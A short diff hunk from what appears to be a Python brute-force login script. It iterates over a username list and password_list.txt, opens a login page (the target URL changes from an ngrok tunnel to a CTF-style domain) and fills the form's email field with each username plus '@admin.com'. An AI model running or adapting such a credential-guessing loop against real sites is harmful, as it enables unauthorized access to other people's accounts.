@@ -19,7 +19,7 @@ with open('password_list.txt','r') as c:
 
 for username in f1:
     for password in f2:
-        response=b.open("http://305d07726f0b.ngrok.io")
+        response=b.open("tryhackus-theboyes.ml")
         b.select_form(nr=0)
         a=username
         b.form['email']=a+'@admin.com'
